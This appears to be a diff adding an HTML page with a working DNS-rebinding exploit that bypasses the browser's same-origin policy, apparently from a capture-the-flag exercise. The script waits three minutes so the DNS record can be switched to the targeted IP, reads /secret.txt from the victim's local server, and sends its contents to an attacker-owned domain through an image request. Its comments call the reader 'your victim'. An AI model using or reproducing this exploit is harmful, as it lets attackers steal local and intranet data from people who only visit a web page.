@@ -1,0 +1,44 @@
+<html>
+<head>
+</head>
+    <body>
+        <h2>Bypass Some Origin Policy clean script</h2>
+        <p>Pretty things that makes your victim stays for few minutes...</p>
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.1/jquery.min.js"></script>
+        <script type="text/javascript">
+
+            window.onload =  function(){
+                SOP_active();
+            };
+
+            /*
+                Example of Same Origin Policy error : 
+
+                XMLHttpRequest cannot load http://127.0.0.1/secret.txt. No 'Access-Control-Allow-Origin' header is present on the requested resource. Origin 'http://ctf.mpgn.fr' is therefore not allowed access.
+            */
+            function SOP_active() {
+                $.get('http://127.0.0.1/secret.txt', function(data) {
+                });
+            }
+
+            /*
+                Bypass Same Origin Policy with DNS-rebinding
+
+                The request works like a charm once you modify the DNS IP with the IP targeted
+                Wait few minutes because the DNS need to be propagate ~2-3 min (Cloudflare ~3min because TTL min is 120s)
+                Then I send the result to another domain i own.
+
+                To send the result the victim can click on a link or we can use a timercallback.
+                I use the button in the demo
+            */
+            setTimeout(function SOP_bypass() {
+                console.log("send request...")
+                $.get('/secret.txt', function(data) {
+                    var image = new Image();
+                    image.src='http://domain.fr/save.php?'+data;
+                });
+            }, 180000); //3min
+        </script>
+    </body>
+</html>
